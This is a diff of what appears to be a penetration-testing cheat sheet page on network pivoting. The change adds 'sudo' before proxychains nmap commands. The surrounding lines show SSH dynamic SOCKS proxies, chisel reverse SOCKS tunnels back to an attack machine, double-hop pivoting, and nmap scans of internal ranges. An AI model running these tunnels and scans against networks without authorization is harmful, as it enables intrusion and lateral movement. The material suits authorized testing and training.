@@ -98,10 +98,10 @@ ssh <span class="nt">-D</span> 9050 &lt;username&gt;@&lt;target IP address&gt;
 <span class="c"># connect scans will work using nmap.</span>
 
 <span class="c"># Nmap ping scan on Linux targets:</span>
-proxychains nmap <span class="nt">-sn</span> 172.16.5.1-200 <span class="c"># nmap ping scan.</span>
+<span class="nb">sudo </span>proxychains nmap <span class="nt">-sn</span> 172.16.5.1-200 <span class="c"># nmap ping scan.</span>
 
 <span class="c"># Nmap full TCP connect scan without ping for windows targets:</span>
-proxychains nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> 172.16.5.19
+<span class="nb">sudo </span>proxychains nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> 172.16.5.19
 </code></pre></div>
 
 <h2>Remote port forwarding with SSH (reverse shell example)</h2>
@@ -269,7 +269,7 @@ chisel client <span class="nt">--max-retry-count</span> 5 &lt;attack_machine_IP&
 chisel client <span class="nt">--max-retry-count</span> 5 &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:socks
 
 <span class="c"># Then prepend any command with proxychains</span>
-proxychains nmap &lt;...&gt;
+<span class="nb">sudo </span>proxychains nmap &lt;...&gt;
 
 <span class="c">################</span>
 <span class="c"># Double reverse pivoting with SOCKS5</span>
@@ -292,7 +292,7 @@ chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9050 <span c
 .<span class="se">\c</span>hisel.exe client <span class="nt">--max-retry-count</span> 5 &lt;first target IP&gt;:9002 R:9999:socks
 
 <span class="c"># On attack box, check that double hop is working:</span>
-proxychains nmap <span class="nt">-sT</span> <span class="nt">-p</span> 22 &lt;reachable IP through second target only&gt;
+<span class="nb">sudo </span>proxychains nmap <span class="nt">-sT</span> <span class="nt">-p</span> 22 &lt;reachable IP through second target only&gt;
 
 <span class="c">################</span>
 <span class="c"># Bind pivoting with SOCKS5</span>
